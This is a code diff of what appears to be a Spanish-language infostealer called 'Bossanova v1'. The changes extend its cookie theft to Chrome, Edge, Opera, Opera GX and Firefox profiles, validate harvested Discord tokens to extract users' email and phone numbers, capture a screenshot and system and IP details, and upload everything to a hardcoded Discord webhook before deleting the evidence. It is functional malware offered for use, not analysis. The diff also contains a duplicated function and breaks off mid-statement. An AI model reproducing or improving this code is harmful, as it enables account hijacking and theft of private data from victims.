@@ -196,51 +196,63 @@ def generar_archivo_historial():
   return txt_path
 
 
-def empaquetar_network():
-  network_dir = os.path.join(
-      os.path.expanduser("~"),
-      "AppData",
-      "Local",
-      "Google",
-      "Chrome",
-      "User Data",
-      "Default",
-      "Network",
-  )
+def empaquetar_network(browser="chrome"):
+    browser = browser.lower()
+    appdata_local = os.path.join(os.path.expanduser("~"), "AppData", "Local")
+    appdata_roaming = os.path.join(os.path.expanduser("~"), "AppData", "Roaming")
+    
+    target_dir = None
+    
+    if browser == "chrome":
+        target_dir = os.path.join(appdata_local, "Google", "Chrome", "User Data", "Default", "Network")
+    elif browser == "edge":
+        target_dir = os.path.join(appdata_local, "Microsoft", "Edge", "User Data", "Default", "Network")
+    elif browser == "opera":
+        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera Stable", "Default", "Network")
+    elif browser == "operagx":
+        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera GX Stable", "Default", "Network")
+    elif browser == "firefox":
+        # Usamos directamente la ruta específica del perfil que contiene las cookies
+        target_dir = os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles", "mipt27ed.default-release")
+    else:
+        return None
 
-  if not os.path.exists(network_dir):
-    return None
+    if not target_dir or not os.path.exists(target_dir):
+        return None
 
-  temp_dir = tempfile.gettempdir()
-  staging_dir = os.path.join(temp_dir, "chrome_network_staging")
-  zip_base_path = os.path.join(temp_dir, "chrome_network_data")
+    temp_dir = tempfile.gettempdir()
+    staging_dir = os.path.join(temp_dir, f"{browser}_network_staging")
+    zip_base_path = os.path.join(temp_dir, f"{browser}_network_data")
 
-  try:
-    if os.path.exists(staging_dir):
-      shutil.rmtree(staging_dir, ignore_errors=True)
-    os.makedirs(staging_dir, exist_ok=True)
+    try:
+        if os.path.exists(staging_dir):
+            shutil.rmtree(staging_dir, ignore_errors=True)
+        os.makedirs(staging_dir, exist_ok=True)
 
-    for item in os.listdir(network_dir):
-      source_item = os.path.join(network_dir, item)
-      target_item = os.path.join(staging_dir, item)
-      try:
-        if os.path.isdir(source_item):
-          shutil.copytree(source_item, target_item, dirs_exist_ok=True)
-        else:
-          shutil.copy2(source_item, target_item)
-      except Exception:
-        pass
+        for item in os.listdir(target_dir):
+            source_item = os.path.join(target_dir, item)
+            target_item = os.path.join(staging_dir, item)
+            try:
 
-    shutil.make_archive(zip_base_path, "zip", staging_dir)
-    final_zip_file = zip_base_path + ".zip"
+                if browser == "firefox" and not item.startswith("cookies.sqlite"):
+                    continue # Comenta esta línea si prefieres respaldar todo el perfil de Firefox
+                
+                if os.path.isdir(source_item):
+                    shutil.copytree(source_item, target_item, dirs_exist_ok=True)
+                else:
+                    shutil.copy2(source_item, target_item)
+            except Exception:
+                pass
 
-    if os.path.exists(staging_dir):
-      shutil.rmtree(staging_dir, ignore_errors=True)
+        shutil.make_archive(zip_base_path, "zip", staging_dir)
+        final_zip_file = zip_base_path + ".zip"
 
-    return final_zip_file
-  except Exception:
-    return None
+        if os.path.exists(staging_dir):
+            shutil.rmtree(staging_dir, ignore_errors=True)
 
+        return final_zip_file
+    except Exception:
+        return None
 
 def capturar_pantalla_jpg():
   try:
@@ -262,166 +274,237 @@ def capturar_pantalla_jpg():
 
 WEBHOOK_URL_UNICO = "https://discord.com/api/webhooks/1560604217654386858/RcEuKQFGc-pguKLBFfaUmepTYVNlPlF0yzr1o-UAF-goZL7JCdt9Ifbi3lr-c_npaC3e"
 
+def empaquetar_network(browser="chrome"):
+    browser = browser.lower()
+    appdata_local = os.path.join(os.path.expanduser("~"), "AppData", "Local")
+    appdata_roaming = os.path.join(os.path.expanduser("~"), "AppData", "Roaming")
+    
+    target_dir = None
+    
+    if browser == "chrome":
+        target_dir = os.path.join(appdata_local, "Google", "Chrome", "User Data", "Default", "Network")
+    elif browser == "edge":
+        target_dir = os.path.join(appdata_local, "Microsoft", "Edge", "User Data", "Default", "Network")
+    elif browser == "opera":
+        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera Stable", "Default", "Network")
+    elif browser == "operagx":
+        target_dir = os.path.join(appdata_roaming, "Opera Software", "Opera GX Stable", "Default", "Network")
+    elif browser == "firefox":
+        target_dir = os.path.join(appdata_roaming, "Mozilla", "Firefox", "Profiles", "mipt27ed.default-release")
+    else:
+        return None
+
+    if not target_dir or not os.path.exists(target_dir):
+        return None
+
+    temp_dir = tempfile.gettempdir()
+    staging_dir = os.path.join(temp_dir, f"{browser}_network_staging")
+    zip_base_path = os.path.join(temp_dir, f"{browser}_network_data")
+
+    try:
+        if os.path.exists(staging_dir):
+            shutil.rmtree(staging_dir, ignore_errors=True)
+        os.makedirs(staging_dir, exist_ok=True)
+
+        for item in os.listdir(target_dir):
+            source_item = os.path.join(target_dir, item)
+            target_item = os.path.join(staging_dir, item)
+            try:
+                if browser == "firefox" and not item.startswith("cookies.sqlite"):
+                    continue
+                
+                if os.path.isdir(source_item):
+                    shutil.copytree(source_item, target_item, dirs_exist_ok=True)
+                else:
+                    shutil.copy2(source_item, target_item)
+            except Exception:
+                pass
+
+        shutil.make_archive(zip_base_path, "zip", staging_dir)
+        final_zip_file = zip_base_path + ".zip"
+
+        if os.path.exists(staging_dir):
+            shutil.rmtree(staging_dir, ignore_errors=True)
+
+        return final_zip_file
+    except Exception:
+        return None
+
 
 def obtener_info_pc():
-  info_sistema = {}
+    info_sistema = {}
 
-  try:
-    cmd_cpu = "wmic cpu get name"
-    procesador = (
-        subprocess.check_output(cmd_cpu, shell=True)
-        .decode("utf-8", errors="ignore")
-        .split("\n")[1]
-        .strip()
+    try:
+        cmd_cpu = "wmic cpu get name"
+        procesador = (
+            subprocess.check_output(cmd_cpu, shell=True)
+            .decode("utf-8", errors="ignore")
+            .split("\n")[1]
+            .strip()
+        )
+        info_sistema["procesador"] = procesador if procesador else "Desconocido"
+    except Exception:
+        info_sistema["procesador"] = platform.processor() or "Desconocido"
+
+    info_sistema["os"] = (
+        f"{platform.system()} {platform.release()} ({platform.version()})"
     )
-    info_sistema["procesador"] = procesador if procesador else "Desconocido"
-  except Exception:
-    info_sistema["procesador"] = platform.processor() or "Desconocido"
+    info_sistema["nombre_pc"] = socket.gethostname()
 
-  info_sistema["os"] = (
-      f"{platform.system()} {platform.release()} ({platform.version()})"
-  )
-  info_sistema["nombre_pc"] = socket.gethostname()
+    try:
+        info_sistema["ip_local"] = socket.gethostbyname(info_sistema["nombre_pc"])
+    except Exception:
+        info_sistema["ip_local"] = "No disponible"
 
-  try:
-    info_sistema["ip_local"] = socket.gethostbyname(info_sistema["nombre_pc"])
-  except Exception:
-    info_sistema["ip_local"] = "No disponible"
+    try:
+        response = requests.get("https://api.ipify.org?format=json", timeout=5)
+        info_sistema["ip_publica"] = response.json().get("ip", "No disponible")
+    except Exception:
+        info_sistema["ip_publica"] = "No disponible"
 
-  try:
-    response = requests.get("https://api.ipify.org?format=json", timeout=5)
-    info_sistema["ip_publica"] = response.json().get("ip", "No disponible")
-  except Exception:
-    info_sistema["ip_publica"] = "No disponible"
+    try:
+        cmd_gpu = "wmic path win32_videocontroller get name"
+        gpu = (
+            subprocess.check_output(cmd_gpu, shell=True)
+            .decode("utf-8", errors="ignore")
+            .split("\n")[1]
+            .strip()
+        )
+        info_sistema["gpu"] = gpu if gpu else "Desconocida"
+    except Exception:
+        info_sistema["gpu"] = "No disponible"
 
-  try:
-    cmd_gpu = "wmic path win32_videocontroller get name"
-    gpu = (
-        subprocess.check_output(cmd_gpu, shell=True)
-        .decode("utf-8", errors="ignore")
-        .split("\n")[1]
-        .strip()
-    )
-    info_sistema["gpu"] = gpu if gpu else "Desconocida"
-  except Exception:
-    info_sistema["gpu"] = "No disponible"
-
-  return info_sistema
+    return info_sistema
 
 
 def obtener_datos_usuario(token):
-  headers = {"Authorization": token.strip(), "Content-Type": "application/json"}
-  try:
-    response = requests.get(
-        "https://discord.com/api/v10/users/@me", headers=headers
-    )
-    if response.status_code == 200:
-      return {"success": True, "data": response.json()}
-    else:
-      return {"success": False, "status": response.status_code}
-  except Exception as e:
-    return {"success": False, "status": str(e)}
+    headers = {"Authorization": token.strip(), "Content-Type": "application/json"}
+    try:
+        response = requests.get(
+            "https://discord.com/api/v10/users/@me", headers=headers
+        )
+        if response.status_code == 200:
+            return {"success": True, "data": response.json()}
+        else:
+            return {"success": False, "status": response.status_code}
+    except Exception as e:
+        return {"success": False, "status": str(e)}
 
 
 def enviar_reporte_completo(tokens):
-  datos_pc = obtener_info_pc()
+    datos_pc = obtener_info_pc()
 
-  descripcion = (
-      f" **PC:** `{datos_pc['nombre_pc']}`\n"
-      f" **OS:** `{datos_pc['os']}`\n"
-      f" **Procesador:** `{datos_pc['procesador']}`\n"
-      f" **Gráfica (GPU):** `{datos_pc['gpu']}`\n"
-      f" **IP Local:** `{datos_pc['ip_local']}`\n"
-      f" **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
-      f"---\n"
-      f" **Tokens:**\n"
-  )
-
-  if tokens:
-    for token in tokens:
-      token_limpio = token.strip()
-      resultado = obtener_datos_usuario(token_limpio)
-
-      if resultado["success"]:
-        user_data = resultado["data"]
-        username = user_data.get("username", "Desconocido")
-        user_id = user_data.get("id", "Desconocido")
-        email = user_data.get("email", "No disponible")
-        phone = user_data.get("phone", "No disponible")
-
-        descripcion += (
-            f"\n **User:** `{username}` (ID: `{user_id}`)\n"
-            f"• **Email:** `{email}` | **Tel:** `{phone}`\n"
-            f"• **Token:**\n`{token_limpio}`\n"
-        )
-      else:
-        status = resultado["status"]
-        descripcion += (
-            f"\n **Token Inválido (Error: {status}):**\n`{token_limpio}`\n"
-        )
-
-      time.sleep(0.5)
-  else:
-    descripcion += "_No se encontraron tokens._"
-
-  if len(descripcion) > 4000:
-    descripcion = descripcion[:3997] + "..."
-
-  payload = {
-      "embeds": [{
-          "title": "Bossanova v1",
-          "description": descripcion,
-          "color": 5814783,
-          "footer": {"text": "Por BossaNova"},
-      }]
-  }
-
-  txt_path = generar_archivo_historial()
-  zip_path = empaquetar_network()
-  img_jpg_stream = capturar_pantalla_jpg()
-
-  files = {}
-  try:
-    f_txt = open(txt_path, "rb") if os.path.exists(txt_path) else None
-    f_zip = open(zip_path, "rb") if zip_path and os.path.exists(zip_path) else None
-
-    if f_txt:
-      files["file1"] = ("historial_global.txt", f_txt, "text/plain")
-    if f_zip:
-      files["file2"] = ("chrome_network_data.zip", f_zip, "application/zip")
-    if img_jpg_stream:
-      files["file3"] = ("captura.jpg", img_jpg_stream.getvalue(), "image/jpeg")
-
-    requests.post(
-        WEBHOOK_URL_UNICO,
-        data={"payload_json": json.dumps(payload)},
-        files=files,
+    descripcion = (
+        f" **PC:** `{datos_pc['nombre_pc']}`\n"
+        f" **OS:** `{datos_pc['os']}`\n"
+        f" **Procesador:** `{datos_pc['procesador']}`\n"
+        f" **Gráfica (GPU):** `{datos_pc['gpu']}`\n"
+        f" **IP Local:** `{datos_pc['ip_local']}`\n"
+        f" **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
+        f"---\n"
+        f" **Tokens:**\n"
     )
 
-    if f_txt:
-      f_txt.close()
-    if f_zip:
-      f_zip.close()
-  except Exception:
-    pass
+    if tokens:
+        for token in tokens:
+            token_limpio = token.strip()
+            resultado = obtener_datos_usuario(token_limpio)
 
-  if os.path.exists(txt_path):
-    try:
-      os.remove(txt_path)
-    except:
-      pass
+            if resultado["success"]:
+                user_data = resultado["data"]
+                username = user_data.get("username", "Desconocido")
+                user_id = user_data.get("id", "Desconocido")
+                email = user_data.get("email", "No disponible")
+                phone = user_data.get("phone", "No disponible")
 
-  if zip_path and os.path.exists(zip_path):
+                descripcion += (
+                    f"\n **User:** `{username}` (ID: `{user_id}`)\n"
+                    f"• **Email:** `{email}` | **Tel:** `{phone}`\n"
+                    f"• **Token:**\n`{token_limpio}`\n"
+                )
+            else:
+                status = resultado["status"]
+                descripcion += (
+                    f"\n **Token Inválido (Error: {status}):**\n`{token_limpio}`\n"
+                )
+
+            time.sleep(0.5)
+    else:
+        descripcion += "_No se encontraron tokens._"
+
+    if len(descripcion) > 4000:
+        descripcion = descripcion[:3997] + "..."
+
+    payload = {
+        "embeds": [{
+            "title": "Bossanova v1",
+            "description": descripcion,
+            "color": 5814783,
+            "footer": {"text": "Por BossaNova"},
+        }]
+    }
+
+    txt_path = generar_archivo_historial() if 'generar_archivo_historial' in globals() else None
+    img_jpg_stream = capturar_pantalla_jpg() if 'capturar_pantalla_jpg' in globals() else None
+
+    navegadores = ["chrome", "edge", "opera", "operagx", "firefox"]
+    zip_paths = {}
+    for nav in navegadores:
+        zp = empaquetar_network(nav)
+        if zp and os.path.exists(zp):
+            zip_paths[nav] = zp
+
+    files = {}
+    open_files = []
     try:
-      os.remove(zip_path)
-    except:
-      pass
+        if txt_path and os.path.exists(txt_path):
+            f_txt = open(txt_path, "rb")
+            open_files.append(f_txt)
+            files["file1"] = ("historial_global.txt", f_txt, "text/plain")
+
+        file_idx = 2
+        for nav, zp in zip_paths.items():
+            f_zip = open(zp, "rb")
+            open_files.append(f_zip)
+            files[f"file{file_idx}"] = (f"{nav}_network_data.zip", f_zip, "application/zip")
+            file_idx += 1
+
+        if img_jpg_stream:
+            files[f"file{file_idx}"] = ("captura.jpg", img_jpg_stream.getvalue(), "image/jpeg")
+
+        requests.post(
+            WEBHOOK_URL_UNICO,
+            data={"payload_json": json.dumps(payload)},
+            files=files,
+        )
+
+        for f in open_files:
+            f.close()
+    except Exception:
+        for f in open_files:
+            try:
+                f.close()
+            except:
+                pass
+
+    if txt_path and os.path.exists(txt_path):
+        try:
+            os.remove(txt_path)
+        except:
+            pass
+
+    for zp in zip_paths.values():
+        if os.path.exists(zp):
+            try:
+                os.remove(zp)
+            except:
+                pass
 
 
 if __name__ == "__main__":
-  tokens = obtener_tokens_reales()
-  enviar_reporte_completo(tokens)
-
+    tokens = obtener_tokens_reales() if 'obtener_tokens_reales' in globals() else []
+    enviar_reporte_completo(tokens)
+  
 try:
   import urllib.request
 
